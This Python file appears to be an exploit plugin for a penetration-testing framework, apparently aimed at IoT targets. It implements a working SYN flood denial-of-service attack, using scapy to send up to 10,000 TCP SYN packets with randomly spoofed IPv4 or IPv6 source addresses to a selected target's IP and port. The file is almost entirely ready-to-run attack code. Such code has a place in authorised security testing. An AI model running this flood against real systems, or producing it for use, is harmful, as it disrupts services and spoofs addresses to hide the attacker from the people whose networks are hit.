#!/usr/bin/python3

import logging
import pluggy
from typing import Optional, Any
from scapy.all import *
from random import randint
from sat_toolkit.core.exploit_spec import ExploitResult
from sat_toolkit.models.Target_Model import TargetManager
from sat_toolkit.tools.input_mgr import Input_Mgr
from sat_toolkit.core.base_plugin import BasePlugin

logger = logging.getLogger(__name__)
hookimpl = pluggy.HookimplMarker("exploit_mgr")

class SynFloodAttackPlugin(BasePlugin):
    def __init__(self):
        super().__init__({
            'Name': 'SYN Flood Attack',
            'Description': 'Performs a SYN flood attack on a specified target.',
            'License': 'GPL',
            'Author': ['iotsploit'],
            'Parameters': {
                'port': {
                    'type': 'int',
                    'required': True,
                    'description': 'Target port number for the SYN flood attack',
                    'default': 80,
                    'validation': {
                        'min': 1,
                        'max': 65535
                    }
                },
                'count': {
                    'type': 'int',
                    'required': True,
                    'description': 'Number of SYN packets to send',
                    'default': 1000,
                    'validation': {
                        'min': 1,
                        'max': 10000
                    }
                }
            }
        })

    @hookimpl
    def initialize(self, device_plugin: Optional[Any] = None):
        logger.info("Initializing SynFloodAttackPlugin")
        pass

    @hookimpl
    def execute(self, target: Optional[Any] = None, parameters: Optional[dict] = None) -> ExploitResult:
        logger.info(f"Executing SynFloodAttackPlugin with target: {target} and parameters: {parameters}")
        target_manager = TargetManager.get_instance()
        current_target = target_manager.get_current_target()
        
        logger.info(f"Current target: {current_target}")
        if current_target is None:
            return ExploitResult(False, "No target selected. Please load a target first.", {})

        # Use parameters if provided, otherwise use Input_Mgr
        if parameters:
            port = parameters.get('port', 80)
            count = parameters.get('count', 1000)
        else:
            # Get port number from user input
            port = Input_Mgr.Instance().int_input(
                "Enter the target port number for SYN flood attack:",
                min_val=1,
                max_val=65535
            )
            # Get packet count from user input
            count = Input_Mgr.Instance().int_input(
                "Enter the number of packets to send:",
                min_val=1,
                max_val=10000
            )

        # Extract target information from the current target object
        target = {
            'ip': current_target.ip_address,
            'port': port,
            'count': count,
            'ipv6': False
        }

        if not target['ip']:
            return ExploitResult(False, "Target IP address not found", {})

        try:
            total = self._syn_flood_v6(target['ip'], target['port'], target['count']) if target['ipv6'] else self._syn_flood(target['ip'], target['port'], target['count'])
            return ExploitResult(True, f"SYN flood attack successful. Sent {total} packets", {
                "packets_sent": total,
                "target_ip": target['ip'],
                "target_port": target['port'],
                "ipv6": target['ipv6']
            })
        except Exception as e:
            logger.error(f"Error during SYN flood attack: {str(e)}")
            return ExploitResult(False, f"SYN flood attack failed: {str(e)}", {})

    @hookimpl
    def cleanup(self):
        logger.info("Cleaning up SynFloodAttackPlugin")
        pass

    def _random_ip(self):
        return ".".join(map(str, (randint(0, 255) for _ in range(4))))

    def _rand_int(self):
        return randint(1000, 9000)

    def _syn_flood(self, dst_ip, dst_port, counter):
        total = 0
        logger.info("Sending IPv4 SYN packets...")

        for _ in range(counter):
            s_port = self._rand_int()
            s_eq = self._rand_int()
            w_indow = self._rand_int()

            ip_packet = IP(src=self._random_ip(), dst=dst_ip)
            tcp_packet = TCP(
                sport=s_port,
                dport=int(dst_port),
                flags="S",
                seq=s_eq,
                window=w_indow
            )

            send(ip_packet/tcp_packet, verbose=0)
            total += 1

        logger.info(f"Total packets sent: {total}")
        return total

    def _syn_flood_v6(self, dst_ip, dst_port, counter):
        total = 0
        logger.info("Sending IPv6 SYN packets...")

        for _ in range(counter):
            s_port = self._rand_int()
            s_eq = self._rand_int()
            w_indow = self._rand_int()

            ip_packet = IPv6(src=RandIP6(), dst=dst_ip)
            tcp_packet = TCP(
                sport=s_port,
                dport=int(dst_port),
                flags="S",
                seq=s_eq,
                window=w_indow
            )

            send(ip_packet/tcp_packet, verbose=0)
            total += 1

        logger.info(f"Total packets sent: {total}")
        return total

def register_plugin(pm):
    syn_flood_attack_plugin = SynFloodAttackPlugin()
    pm.register(syn_flood_attack_plugin)
